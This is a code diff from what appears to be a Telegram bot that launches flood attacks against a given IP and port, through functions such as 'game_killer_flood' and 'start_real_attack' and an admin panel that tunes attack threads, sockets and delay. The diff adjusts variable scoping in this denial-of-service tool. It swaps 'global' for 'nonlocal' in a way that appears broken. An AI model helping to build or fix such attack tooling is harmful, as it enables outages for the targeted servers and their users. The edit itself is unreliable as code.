@@ -279,7 +279,7 @@ def game_killer_flood(ip, port):
         sock.close()
 
 def start_real_attack(ip, port, duration, method, user_id, update_func):
-    global attack_running, attack_stats, active_attack_threads
+    global attack_running, attack_stats, active_attack_threads, ATTACK_THREADS, SOCKETS_PER_THREAD, ATTACK_DELAY
     
     attack_running = True
     with stats_lock:
@@ -562,14 +562,14 @@ async def button_handler(update, context):
         ]
         await query.edit_message_text(f"⚙️ *Settings*\nThreads: `{ATTACK_THREADS}`\nSockets/Thread: `{SOCKETS_PER_THREAD}`\nDelay: `{ATTACK_DELAY}`s", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
     elif data == "inc_threads":
-        global ATTACK_THREADS
+        nonlocal ATTACK_THREADS
         if ATTACK_THREADS + 10 <= 200:
             ATTACK_THREADS += 10
             await query.edit_message_text(f"✅ Threads: {ATTACK_THREADS}", reply_markup=admin_panel_kb())
         else:
             await query.answer("Max 200 threads!", show_alert=True)
     elif data == "dec_threads":
-        global ATTACK_THREADS
+        nonlocal ATTACK_THREADS
         if ATTACK_THREADS - 10 >= 50:
             ATTACK_THREADS -= 10
             await query.edit_message_text(f"✅ Threads: {ATTACK_THREADS}", reply_markup=admin_panel_kb())
